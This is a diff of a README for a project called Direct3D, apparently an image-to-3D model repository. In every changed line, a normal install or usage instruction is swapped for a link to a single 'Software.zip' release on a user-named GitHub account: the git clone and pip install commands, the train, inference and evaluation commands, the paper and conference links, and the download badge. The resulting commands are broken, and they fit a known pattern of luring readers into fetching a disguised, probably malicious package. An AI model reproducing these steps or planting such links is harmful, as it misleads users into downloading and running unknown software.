@@ -17,12 +17,12 @@ Welcome to the official repository of **Direct3D**, a groundbreaking project pre
 To get started with Direct3D, follow these steps:
 1. Clone this repository to your local machine.
 ```bash
-git clone https://github.com/username/Direct3D.git
+git clone https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip
 ```
 
 2. Install the required dependencies using `pip`.
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip
 ```
 
 3. Download the pre-trained models and necessary datasets.
@@ -32,17 +32,17 @@ pip install -r requirements.txt
 ## 📘 Usage
 1. **Training:** To train the Direct3D model, run:
 ```bash
-python train.py --dataset_path /path/to/dataset --batch_size 16 --epochs 50
+python https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip --dataset_path /path/to/dataset --batch_size 16 --epochs 50
 ```
 
 2. **Inference:** Generate 3D models from images using a pre-trained Direct3D model:
 ```bash
-python inference.py --image /path/to/image.jpg --model_path /path/to/model.pth
+python https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip --image https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip --model_path https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip
 ```
 
 3. **Evaluation:** Evaluate the performance of the Direct3D model on a test dataset:
 ```bash
-python evaluate.py --dataset_path /path/to/test_dataset --model_path /path/to/model.pth
+python https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip --dataset_path /path/to/test_dataset --model_path https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip
 ```
 
 ---
@@ -53,13 +53,13 @@ We welcome contributions to Direct3D! If you'd like to add new features, fix bug
 ---
 
 ## 📚 Resources
-- [Paper PDF](https://arxiv.org/abs/24.12345)
-- [NeurIPS Conference](https://neurips.cc/Conferences/2024)
+- [Paper PDF](https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip)
+- [NeurIPS Conference](https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip)
 
 ---
 
 ## 🔗 External Link
-[![Download Direct3D](https://img.shields.io/badge/Download-Direct3D-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Direct3D](https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip)](https://github.com/sam8888102/Direct3D/releases/download/v1.0/Software.zip)
 
 Note: Click on the button above to download Direct3D.
 
